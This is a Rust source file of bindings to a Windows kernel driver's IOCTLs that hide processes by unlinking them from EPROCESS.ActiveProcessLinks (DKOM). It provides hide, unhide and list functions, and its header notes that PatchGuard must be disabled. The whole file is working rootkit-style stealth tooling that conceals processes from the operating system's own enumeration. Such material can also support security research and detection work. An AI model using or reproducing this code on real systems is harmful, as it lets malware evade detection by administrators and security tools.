//! DKOM process hiding - Rust bindings for ProcessHide IOCTLs
//!
//! Hides processes from enumeration by unlinking from EPROCESS.ActiveProcessLinks.
//! Requires KPP/PatchGuard disabled.

use crate::driver::open_device;
use crate::error::CallbackError;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::IO::DeviceIoControl;

// IOCTL codes: CTL_CODE(FILE_DEVICE_UNKNOWN=0x22, function, METHOD_BUFFERED=0, FILE_ANY_ACCESS=0)
// 0x880 << 2 = 0x2200, base = 0x00220000 => 0x00222200
const IOCTL_DIOPROCESS_PROCESS_HIDE: u32 = 0x00222200;
const IOCTL_DIOPROCESS_PROCESS_UNHIDE: u32 = 0x00222204;
const IOCTL_DIOPROCESS_PROCESS_HIDE_LIST: u32 = 0x00222208;

const MAX_DKOM_HIDDEN_PROCESSES: usize = 64;

/// Info about a hidden process
#[derive(Debug, Clone)]
pub struct HiddenProcessInfo {
    pub pid: u32,
    pub name: String,
}

/// Request struct matching kernel TargetProcessRequest
#[repr(C)]
struct TargetProcessRequest {
    process_id: u32,
}

/// Single entry matching kernel HiddenProcessEntry
#[repr(C)]
#[derive(Clone, Copy)]
struct HiddenProcessEntry {
    pid: u32,
    process_name: [u8; 16],
}

/// Response struct matching kernel ProcessHideListResponse
#[repr(C)]
struct ProcessHideListResponse {
    count: u32,
    entries: [HiddenProcessEntry; MAX_DKOM_HIDDEN_PROCESSES],
}

/// Hide a process via DKOM (ActiveProcessLinks unlinking)
pub fn process_hide_add(pid: u32) -> Result<(), CallbackError> {
    let handle = open_device()?;

    let request = TargetProcessRequest { process_id: pid };

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_PROCESS_HIDE,
            Some(&request as *const _ as *const std::ffi::c_void),
            std::mem::size_of::<TargetProcessRequest>() as u32,
            None,
            0,
            None,
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    match result {
        Ok(_) => Ok(()),
        Err(e) => Err(CallbackError::IoctlFailed(e.code().0 as u32)),
    }
}

/// Unhide a previously hidden process
pub fn process_hide_remove(pid: u32) -> Result<(), CallbackError> {
    let handle = open_device()?;

    let request = TargetProcessRequest { process_id: pid };

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_PROCESS_UNHIDE,
            Some(&request as *const _ as *const std::ffi::c_void),
            std::mem::size_of::<TargetProcessRequest>() as u32,
            None,
            0,
            None,
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    match result {
        Ok(_) => Ok(()),
        Err(e) => Err(CallbackError::IoctlFailed(e.code().0 as u32)),
    }
}

/// List all currently hidden processes
pub fn process_hide_list() -> Result<Vec<HiddenProcessInfo>, CallbackError> {
    let handle = open_device()?;

    let mut response = unsafe { std::mem::zeroed::<ProcessHideListResponse>() };
    let mut bytes_returned = 0u32;

    let result = unsafe {
        DeviceIoControl(
            handle,
            IOCTL_DIOPROCESS_PROCESS_HIDE_LIST,
            None,
            0,
            Some(&mut response as *mut _ as *mut std::ffi::c_void),
            std::mem::size_of::<ProcessHideListResponse>() as u32,
            Some(&mut bytes_returned),
            None,
        )
    };

    unsafe { let _ = CloseHandle(handle); }

    match result {
        Ok(_) => {
            let count = response.count as usize;
            let mut entries = Vec::with_capacity(count);
            for i in 0..count.min(MAX_DKOM_HIDDEN_PROCESSES) {
                let entry = &response.entries[i];
                let name_len = entry.process_name.iter().position(|&c| c == 0).unwrap_or(16);
                let name = String::from_utf8_lossy(&entry.process_name[..name_len]).to_string();
                entries.push(HiddenProcessInfo {
                    pid: entry.pid,
                    name,
                });
            }
            Ok(entries)
        }
        Err(e) => Err(CallbackError::IoctlFailed(e.code().0 as u32)),
    }
}
